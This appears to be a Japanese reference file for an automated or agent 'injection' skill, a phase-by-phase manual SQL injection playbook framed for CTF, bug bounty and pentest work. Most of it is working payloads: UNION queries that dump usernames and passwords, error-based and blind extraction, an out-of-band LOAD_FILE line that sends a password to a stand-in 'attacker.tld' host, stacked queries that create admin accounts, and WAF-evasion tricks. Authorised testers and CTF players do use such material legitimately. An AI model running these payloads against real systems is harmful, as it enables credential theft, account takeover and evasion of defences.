# SQL Injection — Manual Exploitation

`injection` skill から呼ばれる詳細手順。`'` プローブで応答差 / 時間差を確認したあとの段階を扱う。

## Phase 1 — 注入点の確定とエンジン同定

```
'                       → syntax error / 5xx / length 差
' AND 1=1-- vs 1=2--    → 応答差で boolean 系成立を確認
' AND SLEEP(5)--        → time-based (MySQL/MariaDB)
'; WAITFOR DELAY '0:0:5'-- → MSSQL
' AND pg_sleep(5)--     → PostgreSQL
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- → Oracle
```

エラーメッセージ ("You have an error in your SQL syntax" → MySQL、"ORA-" → Oracle、"PG::" → PostgreSQL、"Microsoft SQL Server" → MSSQL) と関数応答 (`@@version`、`version()`、`banner FROM v$version`) でエンジン同定。

## Phase 2 — 列数特定と UNION-based 抽出

```
' ORDER BY 1-- → ' ORDER BY 8-- (8 でエラー)  → 列数 7
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--   ← 列数合致
' UNION SELECT 1,2,3,4,5,6,7--                        ← 表示位置確認
' UNION SELECT NULL,table_name,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables-- ← table 列挙
' UNION SELECT NULL,column_name,NULL,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='users'-- ← column 列挙
' UNION SELECT NULL,username,password,NULL,NULL,NULL,NULL FROM users--
```

文字列型一致が必要な場合は `' UNION SELECT 'a','b',...`。

## Phase 3 — error-based 抽出 (応答に直接表示されない場合)

```
MySQL:    AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e))
MySQL:    AND UPDATEXML(1, CONCAT(0x7e, (SELECT user())), 1)
MSSQL:    ; SELECT 1/0 (出力対象を error に絞り込んだ後)
PostgreSQL: AND CAST((SELECT version()) AS INT)
```

## Phase 4 — blind 抽出

```
boolean-based:
  AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'
  → 1 文字ずつ二分探索
time-based:
  AND IF(SUBSTRING((SELECT password ...),1,1)='a', SLEEP(5), 0)
out-of-band (MySQL Windows / SQL Server):
  AND LOAD_FILE(CONCAT('\\\\\\\\', (SELECT password FROM users LIMIT 1), '.attacker.tld\\\\a'))
```

OAST callback (interactsh / canary / collaborator) で 1 リクエスト抽出ができれば boolean / time に比べ高速。

## Phase 5 — stacked queries / 二次効果

サポートする driver (MSSQL の sqlsrv、PostgreSQL の libpq、PHP MySQLi multi_query) なら:

```
'; INSERT INTO users(username,password,role) VALUES ('me','x','admin')--
'; CREATE LOGIN sa2 WITH PASSWORD='x'-- (MSSQL)
```

`SELECT INTO OUTFILE` / `COPY ... TO PROGRAM` 経由のファイル書き込み・コマンド実行は権限要確認。

## Phase 6 — WAF 回避

| 技法 | 例 |
|---|---|
| 大文字小文字混合 | `UnIoN SeLeCt` |
| コメント挟み | `UN/**/ION SE/**/LECT` |
| 数値関数迂回 | `0x61646d696e` (hex 化) |
| 空白除去 | tab `%09` / newline `%0a` / `/**/` / `+` |
| 評価式入替 | `OR true` → `OR 2>1` / `OR (3=3)` |
| 二重 URL encode | `%2527` |
| 文字結合 | `CHAR(0x61)+CHAR(0x64)...` |

WAF の cluebot は payload pattern なので、別パターンに変える + payload を分割し parameter pollution で再合流させるのが有効。

## Phase 7 — 最小実証 (CTF / report)

CTF の場合は flag 抽出が目標。bug bounty / pentest 報告は以下を含める:

```
- 注入点 (URL / param / method)
- DBMS 種別 / version
- 抽出した schema / 表名 (件数のみ、内容は出さない)
- 認証バイパス PoC があれば 1 例
- 影響評価 + 修正例 (parameterized query)
```

## 自動化への切替条件

手動で技法 / DBMS / 注入点が確定したら sqlmap に切替えて列挙の効率化を図る (`references/sql-sqlmap.md`)。手動のままで進めるべきは:

- WAF / カスタム認証で sqlmap が誤検知する
- 特殊な request 構造 (multi-step CSRF / dynamic token / 非標準 encoding) で sqlmap の preprocessing が壊れる
- 1 回限りの小さな PoC で artefact を残したくない

## 二次効果との切分け

入力時点で error / response 差が出ない場合は 1 次注入が成立していない。保存後に別 query で再利用される系を疑い `references/sql-second-order.md` に切替える。

## NoSQL backend の見分け

response の error 文に "MongoError" / "BSON" / "$where" が出る、または `{"$ne":""}` で挙動が変わるなら NoSQLi (`references/nosql.md`)。
